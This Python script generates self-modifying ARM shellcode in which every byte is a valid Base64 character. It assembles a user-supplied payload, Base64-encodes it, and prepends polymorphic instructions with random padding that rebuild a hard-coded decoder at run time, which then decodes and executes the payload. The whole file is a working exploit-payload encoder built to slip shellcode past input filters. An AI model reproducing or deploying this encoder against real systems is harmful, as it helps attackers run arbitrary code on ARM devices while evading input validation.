import os, random, string, binascii, re, base64, sys

# Valid Base64 characters are 0-9 (0x30-0x39), A-Z (0x41-0x5A), a-z (0x61-0x7A), +, /, and = (0x2B,0x2F,0x3D)
# Generates Shellcode containing only these bytes

# Random Base64 Character
def randChar():
	return random.choice(string.ascii_uppercase+string.ascii_lowercase+string.digits+"+/=").encode("ascii")

# Ascii value for randChar()
def randByte():
	return "0x"+binascii.hexlify(randChar()).decode()

# Checks if a byte corresponds to a valid base64 character
def isValid(byte):
	return chr(int(byte,16)) in string.ascii_uppercase+string.ascii_lowercase+string.digits+"+/="

# Generates a random instruction where every byte is valid base64
# It generates either eor or sub with random registers and intermediates
# Condition code is either vc, pl or mi
def randInstruction():
	result = ".byte "
	result+=randByte()+", "
	result+="0x"+str(random.choice(range(3,8)))+str(random.choice(range(1,10)))+", "
	result+="0x"+str(random.choice(range(3,8)))+str(random.choice(range(1,10)))+", "
	result+="0x"+str(random.choice(range(4,6)))+"2\n"
	return result

# The bytes for the ARM assembly from base64.s (in Thumb mode)
decoderBytes = ["02", "00", "9F", "4F", "16", "FF", "2F", "E1",
"2A", "A1", "2A", "A2", "0F", "F2", "4D", "03", "98", "47", "4F", "EA", "80", "04", "0F", "F2",
"45", "03", "98", "47", "4F", "EA", "10", "16", "44", "EA", "06", "04", "0F", "F2", "85", "03",
"98", "47", "4F", "EA", "00", "14", "0F", "F2", "2D", "03", "98", "47", "4F", "EA", "90", "06",
"44", "EA", "06", "04", "0F", "F2", "6D", "03", "98", "47", "4F", "EA", "80", "14", "0F", "F2",
"15", "03", "98", "47", "44", "EA", "00", "04", "0F", "F2", "59", "03", "98", "47", "AF", "F2",
"4B", "03", "18", "47", "08", "78", "3D", "28", "04", "BF", "14", "A3", "18", "47", "01", "F1",
"01", "01", "41", "28", "A0", "F1", "41", "00", "BC", "BF", "0F", "F2", "17", "03", "18", "47",
"36", "46", "19", "28", "DC", "BF", "0F", "F2", "09", "03", "18", "47", "A0", "F1", "06", "00",
"F7", "46", "00", "F1", "11", "00", "00", "28", "BC", "BF", "0F", "F2", "0B", "03", "18", "47",
"00", "F1", "34", "00", "F7", "46", "C0", "F1", "00", "00", "4F", "EA", "90", "00", "C0", "F1",
"3F", "00", "F7", "46", "14", "70", "02", "F1", "01", "02", "F7", "46"]


# A lookup table for decomposing bytes
# Contains how to construct each byte by subtracting only valid Base64 bytes from 0x64
# Generated later
# Contains only 248 of 256 possible bytes, as not all are needed
# For Example:
# 0xFF corresponds to 0x65, since 0x64-0x65=0xFF
# 0x5D corresponds to 0x7A,0x2B,0x62, since 0x64-0x7A-0x2B-0x62=0x5D
byteTable = {}

# Validates a given entry to the lookup table
def check(key,value):
	v = 0x64
	for i in value:
		v-=int(i,16)
	if(v!=-int(key,16)):
		print("Error with "+key)

# Similar to the lookup table but without byte overflows
# For the value v, it decomposes the value v+0x64 into valid Base64 hex
# This is equivalent to calculating what values to subtract from 0x64 to get -v
# Only partially implemented, but is only used for a few values
# For Example:
# 1B0 corresponds to 7A,7A,7A,2B,2B,50 since 0x64-0x7A-0x7A-0x7A-0x2B-0x2B-0x50 = 0xFFFFFE50 = -0x1B0

# Also: "%0.2X"%value converts value (an int between 0 and 256) to a string containing its hex value
def calculateOffsets(v):
	value = int(v,16)
	value+=0x64
	count = int(value/0x7a)
	value-=0x7a*count
	result = []
	if value<0x2b:
		count-=1
		value+=0x7a
	if isValid("%0.2X"%value):
		result.append("%0.2X"%value)
	else:
		value-=0x4d
		result.append("4d")
		if value<0x2b:
			result=result[:-1]
			value+=0x4d
			value-=0x2b
			result.append("2b")
		if isValid("%0.2X"%value):
			result.append("%0.2X"%value)
		else:
			if value>0x39 and value<0x41:
				count-=1
				value+=0x7a
				value-=0x4b
				result.append("4b")
				if isValid("%0.2X"%value):
					result.append("%0.2X"%value)
				else:
					print("Error 1: 0x%0.2X Not Implemented"%value)
					exit()
			elif value<0x2b:
				count-=1
				value+=0x7a
				value-=0x2b
				result.append("2b")
				if isValid("%0.2X"%value):
					result.append("%0.2X"%value)
				else:
					if value>0x5a and value<0x61:
						value-=0x2b				
						result.append("2b")
						result.append("%0.2X"%value)	
					else:
						print("Error 2: 0x%0.2X Not Implemented"%value)
						exit()
			else:
				print("Error 3: 0x%0.2X Not Implemented"%value)
				exit()				
	result=["7a"]*count+result
	check(v,result)
	return result

# Validates the byteTable
def validateTable():
	for key in byteTable:
		v = 0x64
		for i in byteTable[key]:
			v-=int(i,16)
			if v<0:
				v+=0x100
		if(v!=int(key,16)):
			print("Error with "+key)

# Generates the byteTable
# Only generates 248 of 256 possible bytes, as not all are used
def createTable():
	for i in range(0x00,0x04):
		byteTable["%0.2X"%i]=["%0.2X"%(0x64-i)]
	for i in range(0x04,0x0a):
		byteTable["%0.2X"%i]=["7a","7a","%0.2X"%(0x70-i)]
	for i in range(0x0a,0x24):
		byteTable["%0.2X"%i]=["%0.2X"%(0x64-i)]
	for i in range(0x24,0x30):
		byteTable["%0.2X"%i]=["7a","5a","%0.2X"%(0x90-i)]
	for i in range(0x2b,0x35):
		byteTable["%0.2X"%i]=["%0.2X"%(0x64-i)]
	for i in range(0x35,0x37):
		byteTable["%0.2X"%i]=["7a","61","%0.2X"%(0x89-i)]
	for i in range(0x37,0x41):
		byteTable["%0.2X"%i]=["7a","7a","%0.2X"%(0x70-i)]
	for i in range(0x41,0x45):
		byteTable["%0.2X"%i]=["7a","61","%0.2X"%(0x89-i)]
	for i in range(0x45,0x5f):
		byteTable["%0.2X"%i]=["7a","2b","%0.2X"%(0xbf-i)]
	for i in range(0x65,0x70):
		byteTable["%0.2X"%i]=["7a","2b","%0.2X"%(0xbf-i)]	
	for i in range(0x70,0x8a):
		byteTable["%0.2X"%i]=["7a","%0.2X"%(0xea-i)]
	for i in range(0x86,0x90):
		byteTable["%0.2X"%i]=["7a","2b","%0.2X"%(0xbf-i)]
	for i in range(0x90,0xaa):
		byteTable["%0.2X"%i]=["7a","%0.2X"%(0xea-i)]
	for i in range(0xaa,0xb0):
		byteTable["%0.2X"%i]=["61","%0.2X"%(0x103-i)]
	for i in range(0xb0,0xca):
		byteTable["%0.2X"%i]=["5a","%0.2X"%(0x10a-i)]
	for i in range(0xca,0xd8):
		byteTable["%0.2X"%i]=["2b","%0.2X"%(0x139-i)]
	for i in range(0xda,0xea):
		byteTable["%0.2X"%i]=["30","%0.2X"%(0x134-i)]
	for i in range(0xea,0x100):
		byteTable["%0.2X"%i]=["%0.2X"%(0x164-i)]
	validateTable()

# Assuming r7 contains 0x64
# Generates instructions to load value to r3
# Stores the byte in r3 to r4-offset
# Every byte of the generated assembly is valid Base64
def polymorph(value, offset):
	string = []
	# Uses the decomposition from the lookup table to load the byte into r3, by subtracting the sequence from r7
	for i,v in enumerate(byteTable[value]):
		string.append("\tsubpl r3, "+("r7" if i==0 else "r3")+", #0x"+v)
	# Stores the byte in r3 to r4-offset (offset is between 0x41 and 0x5B)
	string.append("\tstrbpl r3, [r4, #-"+offset+"]")
	return string


# Generates ARM assembly that dynamically generates the bytes in bytesData
def polymorphRange(bytesData):
	string = []
	# Bytes are generated backwards
	bytes= bytesData[::-1]
	# Subdivides into chunks of 26 (0x1A), since the range 0x41 to 0x5B is the longest range containing only valid characters	
	for i in range(0,len(bytes),26):
		byteSection=bytes[i:i+26]
		offset=0x41
		section = []
		# Generates code to generate each byte in the chunk
		for byte in byteSection:		
			if not isValid(byte):			
				section+=polymorph(byte,str(offset))
			offset+=1
		string=section+string
		section=[]
		# The offset for the chunk is the distance to the end of the polymorphic code (that's why the bytes are generated backwards)
		# 0x41 is added to the offset, since 0x41 is the minimum subtracted from the offset in the strb instructions
		# 7 is also added to the offset, for some reason. 'It just works' - Todd Howard
		# Since r7 contains 0x64, the calculateOffsets returns the values needed to subtract from r7 to get -offset
		# This is loaded into r5
		for i,v in enumerate(calculateOffsets("%0.2X"%(len(string)*4+len(bytes)-i+0x41+7))):
			section.append("\tsubpl r5, "+("r7" if i==0 else "r5")+", #0x"+v)
		# 0x00 is loaded into r3
		section.append("\tsubpl r3, r7, #0x64")
		# This is equivalent to "add r4, pc, offset"
		# r3 is needed since the only sub operations between registers with valid Base64 is if the register is rotated by another
		# This is bypassed by rotating 0 times
		section.append("\tsubpl r4, pc, r5, ror r3")
		string=section+string
	return "\n".join(string)

createTable()

payload = ""
if len(sys.argv)<2:
	print("usage: python3 generate.py [payload source]")
	exit()

# Assembles and extracts the payload shellcode
os.system("arm-linux-gnueabihf-as -o payload.o "+sys.argv[1])
os.system("arm-linux-gnueabihf-objcopy --dump-section .text=payload.bin payload.o")
# Convertes payload bytes to Base64
with open("payload.bin","rb") as f:
	payload=base64.b64encode(f.read()).replace(b"=",b"A")

# First byte in shellcode is 0x64
# This is loaded into r7 later
data = """.syntax unified
.text
.global _start
_start:
	.ARM
	.byte 0x64, 0x45, 0x36, 0x42
"""

# Random instructions used for padding
for _ in range(23):
	data+="\t"+randInstruction()

# Few conditions are valid
# The ones used are plus (greated or equal to 0) and minus (less than 0)
# Since the pl and mi conditions are mutually exclusive, using both ensures exactly one executes, regardless of initial state
# Sets r3 to the address of the first byte (containing 0x64) + 0x38
data +="""
	subpl r3, pc, #48
	submi r3, pc, #52"""

# The only valid ldrb instructions contain a negative immediate offset, with a minimum of 0x30
# This is why the padding is needed
# This loads 0x64 to r7
# These first 28 instructions are basically equivalent to "mov r7, 0x64"
data+="""
	ldrbpl r7, [r3, #-0x38]
	ldrbmi r7, [r3, #-0x38]
"""

# r3 is set to 0
# The operation is stored, so pl condition is now always true
data+="""
	subspl r3, r7, #0x64
	subsmi r3, r7, #0x64

"""

# The polymorphic code to generate the Base64 decoder
data+=polymorphRange(decoderBytes)

# Equivalent to "add r6, pc, #1"
# Branching to r6 would now switch to Thumb mode
data+="""
	subpl r5, r7, #0x64
	subpl r3, r7, #0x69
	subpl r6, pc, r3, ror r5
"""

# Adds on random characters that are converted to the Base64 decoder at run-time by the earlier instructions
# Only invalid characters are replaced
data+="\t.byte 0x"+", 0x".join([byte if isValid(byte) else "%0.2X"%ord(randChar()) for byte in decoderBytes])

# Adds on the payload bytes converted to Base64
# This data is replaced when the Base64 decoder is executed
data+="""
	.ascii \""""+payload.decode()+"="+randChar().decode()*(4-(len(payload)+1)%4)+"""\"
"""

# Writes the source code to arm.s
with open("arm.s","wb+") as f:
	f.write(data.encode("ascii"))

# Assembles the source and extracts the shellcode
os.system("arm-linux-gnueabihf-as -W -o arm.o arm.s")
os.system("arm-linux-gnueabihf-ld -N -o arm arm.o")
os.system("arm-linux-gnueabihf-objcopy --dump-section .text=arm.bin arm.o")

# Checks that every byte in the generated shellcode is valid Base64
with open("arm.bin","r",encoding="ISO-8859-1") as f:
	valid = True
	for char in f.read():
		if not isValid("%0.2X"%ord(char)):
			print("INVALID ASSEMBLY: %0.2X"%ord(char))
			valid=False
	if valid:
		print("Base64 Assembly Generated")
